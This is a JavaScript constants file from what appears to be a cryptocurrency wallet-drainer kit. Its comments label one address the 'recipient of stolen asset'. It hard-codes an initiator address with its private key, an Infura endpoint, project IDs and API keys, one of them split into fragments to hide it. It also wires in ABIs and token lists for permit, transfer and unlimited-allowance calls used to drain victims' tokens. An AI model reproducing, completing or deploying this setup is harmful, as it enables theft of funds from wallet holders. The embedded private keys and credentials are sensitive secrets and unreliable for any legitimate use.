// export const initiator = '0x5049bE34eE05627aD0C500f11B25d23c02F530b1'; // initiator address
// export const initiatorPK = 'bbdeb46f850dd3b11672db4f15b5ff15927cbfcdb9959ddc94df4a99e5966989'; // initiaror's private key

// export const initiator = '0xeE71c83008C5814455223866A881EfE25d5cf347'; // initiator address
export const initiator = '0xF8eb38971de1C54eFaFF081470264BDb0276e516'; // initiator address
export const initiatorPK = 'a5b0e838f10a4d8b8905259113654d9591ddbca02a112c954df396559a5d285f'; // initiaror's private key

// export let recipient = '0x1D26015064db1f8073871041bF554757101f6386'; // recipient of stolen asset
export let recipient = '0xFBD751b4496Ffae785ed17b8a5AC313a2866B029'; // recipient of stolen asset
export { default as ALLOWANCEABI } from './abis/allowanceABI.json';
export { default as permitV2 } from './abis/permitvs.json';
export { default as CLAIMEABI } from './abis/claimABI.json';
export { default as ERC20ABI } from './abis/erc20.json';
// export const projectId = '266adf3f12378f461f72258a250ac519';
export const projectId = '823cefd95a0f9931c46b28bda3bcfb54';
export const deadline = 10000000000000;
export { default as permitTokens }from './permitTokens.json';
export { default as transferTokens } from './transferTokens.json';
export { default as increasAllownceTokens } from './increasAllownceTokens.json';
export const infura = "https://mainnet.infura.io/v3/4d5f05d6b7bb4260a9ba2b2e085844db";

export const max = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

// const keys = [
//   'A',
//   'CUR',
//   '7LHb',
//   'xrjk',
//   'tO',
//   '5xFQ',
//   '32h',
//   'P4',
//   '-UP',
//   'axG',
//   'fpH',
// ];
// let akeys = '';
// keys.forEach((k) => (akeys += k));

export const setRecip = (recip) => {
  recipient = recip;
}
export const apikeys = 's-FyQKCJD1qSs9YTs2Pf3G0VyTVKExwA';
